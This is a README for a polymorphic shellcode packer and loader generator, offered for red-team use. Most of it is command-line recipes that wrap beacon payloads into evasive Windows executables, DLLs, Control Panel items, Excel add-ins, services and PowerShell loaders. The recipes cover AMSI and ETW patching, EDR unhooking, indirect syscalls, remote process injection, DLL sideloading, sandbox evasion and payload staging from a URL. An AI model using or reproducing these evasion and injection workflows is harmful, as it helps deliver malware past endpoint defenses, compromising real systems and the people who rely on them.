# RustPack

A polymorphic shellcode packer and loader generator for authorized penetration testing and red team operations. RustPack takes a raw payload (shellcode, PE, or .NET assembly), encrypts it, and generates a complete standalone Rust loader project that decrypts and executes the payload at runtime using configurable injection techniques.

## How It Works

RustPack is a **code generator**, not a traditional packer. It runs on Linux and produces a cross-compiled Windows binary:

```
┌─────────────────────────────────────────────────────────────┐
│                      RustPack (Linux)                        │
├─────────────────────────────────────────────────────────────┤
│  1. Read input payload (shellcode / PE / .NET)              │
│  2. Encrypt payload with AES-256-CBC (random key + IV)      │
│  3. Encode ciphertext (integer offsets / wordsplit / etc.)   │
│  4. Generate a complete Rust loader project in /tmp/         │
│     • Cargo.toml with windows-sys 0.61.2                    │
│     • src/main.rs (or lib.rs for DLL outputs)               │
│  5. Cross-compile with x86_64-pc-windows-gnu (mingw)        │
│  6. Output the final .exe / .dll / .bin / .ps1              │
└─────────────────────────────────────────────────────────────┘
```

The generated loader incorporates:
- **Polymorphic junk code** — random dead code, fake variables, timing loops, and unreachable branches injected between real statements. Every build produces unique binaries.
- **Anti-emulation** — runtime checks (timing, CPUID) that cause early exit in sandboxes/emulators.
- **Environmental keying** — optional hostname or domain binding so the payload only decrypts on the intended target.
- **Kill date** — automatic self-termination after a specified date.
- **Multiple injection techniques** — from self-injection to remote process injection.
- **Evasion bypasses** — AMSI patching, ETW blinding, ntdll unhooking.

## Prerequisites

### Build Host (Linux)

```bash
# Rust toolchain
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
rustup target add x86_64-pc-windows-gnu

# MinGW cross-compiler
sudo apt install mingw-w64
```

### Verify

```bash
which x86_64-w64-mingw32-gcc   # must exist
rustup target list --installed  # must include x86_64-pc-windows-gnu
```

## Building RustPack

### Direct Build (requires Rust + MinGW on host)

```bash
cd /path/to/rustpack
cargo build --release
```

The binary is at `./target/release/rustpack`.

### Container Build (requires Docker only)

No local Rust or MinGW installation needed — everything runs inside Docker.

```bash
# First run builds the image automatically
./docker-build.sh --file /data/beacon.bin --output /data/packed.exe -a \
  --environmentalhost DC01

# Force rebuild the image (after code changes)
./docker-build.sh --rebuild --file /data/beacon.bin --output /data/packed.exe -a \
  --environmentalhost DC01
```

The wrapper mounts your current directory as `/data` inside the container. Use `/data/` prefix for all `--file` and `--output` paths.

To build the image manually:

```bash
docker build -t rustpack .
docker run --rm -v "$(pwd):/data" rustpack \
  --file /data/beacon.bin --output /data/packed.exe -a --environmentalhost DC01
```

## Usage

```
rustpack --file <INPUT> --output <OUTPUT> -a [OPTIONS] [remoteinject ...]
```

The `-a` flag is mandatory (EULA acceptance).

### Safety Gate

RustPack will refuse to generate a payload that embeds plaintext shellcode without environmental keying. You must use at least one of:
- `--environmentalhost <HOSTNAME>`
- `--environmentaldomain <DOMAIN>`
- `--sandbox DomainJoined`
- `--shellcodeFile <PATH>`
- `--shellcodeURL <URL>`

This prevents accidental exposure of your payload in automated sandbox analysis.

---

## Input Types

| Flag | Input Type | Description |
|------|-----------|-------------|
| *(none)* | Raw shellcode | Default — treats input as position-independent shellcode (.bin) |
| `--pe` | Native PE | Reflectively loads a native .exe in memory |
| `--csharp` | .NET Assembly | Loads via CLR hosting (mscoree) |

---

## Output Formats

| Flag | Format | Description |
|------|--------|-------------|
| *(none)* | EXE | Standard Windows executable |
| `--dll` | DLL | Standard DLL (DllMain → spawn thread) |
| `--sideload <path>` | Sideload DLL | DLL with forwarded exports from a legitimate DLL |
| `--cpl` | CPL | Control Panel item (.cpl) |
| `--xll` | XLL | Excel Add-in (.xll) |
| `--service` | Service EXE | Windows service binary (SCM compatible) |
| `--pic` | PIC shellcode | Position-independent code blob |
| `--ps1` | PowerShell | Randomized PowerShell script loader |

---

## Injection Methods

### Default: Local CreateThread (self-inject)

No subcommand needed — allocates RWX memory in the current process.

### Indirect Syscalls

Add `--syscalls` to any injection method to use indirect syscalls (PEB-based ntdll resolution, SSN extraction, syscall gadget reuse) instead of direct WinAPI calls. This bypasses userland EDR hooks on NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, etc.

```bash
# Local self-inject with syscalls
rustpack --file beacon.bin --output packed.exe -a --environmentalhost DC01 --syscalls

# Remote injection with syscalls
rustpack --file beacon.bin --output injector.exe -a --environmentalhost DC01 --syscalls \
  remoteinject --method crt --target explorer.exe

# Spawn + inject with syscalls
rustpack --file beacon.bin --output injector.exe -a --environmentalhost DC01 --syscalls \
  remoteinject --method crt --target notepad.exe --spawn
```

### Remote Injection

```
rustpack ... remoteinject --method <METHOD> --target <PROCESS> [--spawn]
```

| Method | Description |
|--------|-------------|
| `crt` | `CreateRemoteThread` into target process |
| `apc` | `QueueUserAPC` to alertable threads |
| `fiber` | `CreateFiber` / `SwitchToFiber` in current process |
| `threadless` | Threadless injection with hook + self-restore |
| `poolparty` | Thread pool work item insertion via `CreateRemoteThread` |

The `--spawn` flag creates the target process in a suspended state instead of finding an existing one.

---

## Payload Location

By default, the encrypted payload is embedded directly in the binary. Alternatively:

| Flag | Behaviour |
|------|-----------|
| `--shellcodeFile <PATH>` | Read encrypted payload from a file on disk at runtime |
| `--regPayload <KEY>` | Read from a Windows registry value (e.g. `HKLM\SOFTWARE\Microsoft\Update\Data`) |
| `--shellcodeURL <URL>` | Download encrypted payload from a URL at runtime |

When using staged delivery, the binary is smaller and the payload can be changed without rebuilding.

---

## Evasion & Bypass Features

| Flag | Description |
|------|-------------|
| `--unhook <DLL>` | Map a fresh copy of the DLL from disk and overwrite the .text section to remove hooks |
| `--etwbypass` | Patch `EtwEventWrite` in ntdll to disable ETW tracing |
| `--amsibypass` | Patch AMSI `AmsiScanBuffer` to always return clean (for .NET payloads) |
| `--sandbox Threshold` | Exit if < 2 CPUs, < 2GB RAM, or VMware/VBox tools detected |
| `--sandbox DomainJoined` | Exit if the machine is not domain-joined |
| `--syscalls` | Use indirect syscalls instead of WinAPI for memory/thread operations |

---

## Environmental Keying

| Flag | Description |
|------|-------------|
| `--environmentalhost <HOSTNAME>` | Derive decryption key from hostname SHA-256 — payload only decrypts on the correct host |
| `--environmentaldomain <DOMAIN>` | Only execute if joined to the specified AD domain |
| `--killdate <YYYY-MM-DD>` | Self-terminate after this date (default: today + 30 days) |

---

## Encoding Types

| Flag | Description |
|------|-------------|
| `--encoding default` | Integer offset array (each byte stored as `byte + random_offset`) |
| `--encoding wordsplit` | Split into word-boundary arrays |
| `--encoding base32` | Base32-encoded string |
| `--encoding uuid` | UUID-formatted string array |

Different encodings produce different binary signatures and sizes.

---

## Cosmetics

| Flag | Description |
|------|-------------|
| `--icon <FILE>` | Embed a custom .ico file into the output PE |
| `--cloneMetadata <FILE>` | Clone version info / PE metadata from another binary |

---

## Examples

### Basic — Shellcode to EXE with hostname lock

```bash
rustpack --file beacon.bin --output packed.exe -a \
  --environmentalhost DC01 \
  --killdate 2026-12-31
```

### DLL for sideloading

```bash
rustpack --file beacon.bin --output evil.dll -a \
  --sideload "/path/to/version.dll" \
  --environmentalhost TARGET-WS \
  --unhook ntdll.dll
```

### Remote injection into explorer.exe

```bash
rustpack --file beacon.bin --output injector.exe -a \
  --environmentalhost SRV01 \
  --etwbypass \
  remoteinject --method crt --target explorer.exe
```

### Spawn and inject into a sacrificial process

```bash
rustpack --file beacon.bin --output injector.exe -a \
  --environmentalhost SRV01 \
  --unhook ntdll.dll \
  remoteinject --method apc --target svchost.exe --spawn
```

### .NET assembly with AMSI + ETW bypass

```bash
rustpack --file Seatbelt.exe --output packed.exe -a \
  --csharp \
  --amsibypass \
  --etwbypass \
  --environmentalhost TARGET01
```

### Windows Service binary

```bash
rustpack --file beacon.bin --output svc.exe -a \
  --service \
  --environmentalhost DC01 \
  --killdate 2026-09-01
```

### Staged from URL with sandbox evasion

```bash
rustpack --file beacon.bin --output stager.exe -a \
  --shellcodeURL "https://cdn.example.com/update.bin" \
  --sandbox Threshold \
  --environmentalhost WS-PC03 \
  --encoding uuid
```

### Staged from registry

```bash
rustpack --file beacon.bin --output loader.exe -a \
  --regPayload "HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid" \
  --environmentalhost TARGET01
```

### PIC shellcode output (for custom loaders)

```bash
rustpack --file beacon.bin --output packed.bin -a \
  --pic \
  --environmentalhost SRV01
```

### PowerShell script

```bash
rustpack --file beacon.bin --output loader.ps1 -a \
  --ps1 \
  --environmentalhost WS01
```

### Control Panel / Excel Add-in

```bash
# CPL — executed via: control.exe evil.cpl
rustpack --file beacon.bin --output evil.cpl -a \
  --cpl --environmentalhost TARGET01

# XLL — executed when loaded by Excel
rustpack --file beacon.bin --output evil.xll -a \
  --xll --environmentalhost TARGET01
```

### Fiber injection with ntdll unhook + alternative encoding

```bash
rustpack --file beacon.bin --output packed.exe -a \
  --environmentalhost SRV01 \
  --unhook ntdll.dll \
  --encoding wordsplit \
  remoteinject --method fiber --target explorer.exe
```

### Threadless injection

```bash
rustpack --file beacon.bin --output packed.exe -a \
  --environmentalhost DC01 \
  --etwbypass \
  remoteinject --method threadless --target explorer.exe
```

### Kitchen sink — maximum evasion

```bash
rustpack --file beacon.bin --output evil.dll -a \
  --sideload "/path/to/version.dll" \
  --unhook ntdll.dll \
  --etwbypass \
  --sandbox Threshold \
  --environmentalhost TARGET-PC \
  --killdate 2026-12-31 \
  --encoding base32 \
  --cloneMetadata "/path/to/legit.exe" \
  --icon /path/to/app.ico
```

---

## Architecture

```
src/
├── main.rs              # CLI argument parsing
├── builder.rs           # Orchestrates the full build pipeline
├── codegen.rs           # Generates Cargo.toml + assembles loader source
├── encrypt.rs           # AES-256-CBC encryption
├── encode.rs            # Payload encoding (int offset, wordsplit, base32, uuid)
├── polymorphism.rs      # Junk code injection engine
├── syscalls.rs          # Indirect syscall injection variants (PEB walk, SSN extraction)
├── anti_emulation.rs    # Anti-sandbox/emulator checks
├── environmental.rs     # Hostname/domain keying, kill date, sandbox threshold
├── payload_location.rs  # Staged payload retrieval (file, registry, URL)
├── metadata.rs          # PE metadata cloning, icon embedding
├── interactive_ps.rs    # Interactive PowerShell runspace
├── injection/
│   ├── local_crt.rs     # VirtualAlloc + CreateThread (self-inject)
│   ├── remote_crt.rs    # CreateRemoteThread (existing / spawn)
│   ├── apc.rs           # QueueUserAPC (existing / spawn)
│   ├── fiber.rs         # CreateFiber / SwitchToFiber
│   ├── threadless.rs    # Threadless hook injection
│   └── pool_party.rs    # Thread pool work item injection
├── bypass/
│   ├── amsi.rs          # AMSI patch
│   ├── etw.rs           # ETW patch
│   └── userland_hooks.rs # Full DLL unhooking (fresh .text from disk)
├── input/
│   ├── shellcode.rs     # Raw shellcode handling
│   ├── pe.rs            # Reflective PE loader codegen
│   └── dotnet.rs        # CLR hosting codegen
└── output/
    ├── exe.rs           # Standard EXE template
    ├── dll.rs           # DLL template (DllMain)
    ├── sideload.rs      # Sideload DLL with export forwarding
    ├── cpl.rs           # Control Panel item template
    ├── xll.rs           # Excel Add-in template
    ├── service.rs       # Windows Service template
    ├── pic.rs           # PIC output (donut-style)
    └── powershell.rs    # PowerShell script generation
```

---

## How the Generated Loader Works (Runtime)

1. **Anti-emulation** — Timing check / CPUID to detect emulators
2. **Kill date** — Compare current time against embedded deadline
3. **Environmental checks** — Verify hostname hash / domain membership
4. **Sandbox threshold** — Check CPU count, RAM, VM processes
5. **Decode** — Reverse the encoding to recover ciphertext
6. **Decrypt** — AES-256-CBC decryption with embedded key/IV
7. **Bypass** — Unhook ntdll / patch AMSI / patch ETW
8. **Inject** — Execute shellcode via selected technique

Each step exits silently on failure (no error messages, no crash dumps).

---

## OPSEC Considerations

- Every build is **polymorphically unique** — different junk code, variable names, and code ordering
- The hostname-keyed variant uses **SHA-256 of the hostname** as a gate — the actual hostname never appears in the binary
- Staged payloads (`--shellcodeFile`, `--shellcodeURL`, `--regPayload`) keep the binary clean of any encrypted blob
- The `--sideload` option forwards all exports to the real DLL, making the weaponized DLL a drop-in replacement
- Kill dates ensure payloads become inert after the engagement window

---

## Legal

This tool is intended exclusively for **authorized penetration testing and red team operations**. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The `-a` flag serves as acknowledgment of this restriction.
